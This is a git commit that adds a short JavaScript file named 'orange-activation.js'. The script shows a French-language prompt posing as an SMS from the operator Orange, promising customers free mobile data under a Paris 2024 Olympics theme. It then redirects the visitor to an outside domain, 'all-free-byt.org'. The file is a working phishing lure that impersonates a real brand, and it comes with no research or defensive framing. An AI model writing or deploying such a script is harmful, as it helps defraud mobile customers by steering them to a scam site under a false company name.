89c37028be85842f00e168e1ef1d0cfbd55467c0
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-09-12 10:42:56 -0700

    Create orange-activation.js

---
+++ orange-activation.js
@@ -0,0 +1,6 @@
+
+var password = 'Paris 2024 olympics'
+password=prompt('SMS: Cher client, veuillez vérifier si votre carte SIM Orange est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur Ok pour vérifier maintenant. ','Paris 2024 olympics');
+if (password != 'Paris 2024 olympics') {
+location.href='https://all-free-byt.org/pa-ris24.html';
+}
